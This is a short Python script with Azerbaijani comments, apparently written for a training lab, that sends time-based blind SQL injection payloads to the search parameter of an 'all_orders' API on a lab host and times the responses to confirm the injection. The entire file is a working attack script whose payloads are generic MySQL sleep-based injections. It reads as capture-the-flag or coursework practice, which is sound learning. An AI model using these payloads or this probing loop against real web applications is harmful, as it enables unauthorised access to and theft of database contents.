import requests
import time

url = "http://web0x01.hbtn/a3/sql_injection/api/all_orders"

# Bayrağın uzunluğunu və ya simvollarını tapmaq üçün skript
# Əvvəlcə bayrağı ekrana çıxaracaq time-based şərti yoxlayaq
payloads = [
    "test' AND (SELECT * FROM (SELECT(SLEEP(6)))x)--",
    "test' AND (SELECT IF(1=1, SLEEP(6), 0))--"
]

for p in payloads:
    print(f"Yoxlanılır: {p}")
    start = time.time()
    try:
        res = requests.get(url, params={"search": p}, timeout=10)
        dur = time.time() - start
        print(f"Müddət: {dur:.2f} saniyə")
        if dur >= 5:
            print("[+] UĞURLU! Gecikmə işlədi.")
            break
    except requests.exceptions.Timeout:
        print("[+] TIMEOUT! Gecikmə 10 saniyədən çox çəkdi.")
        break
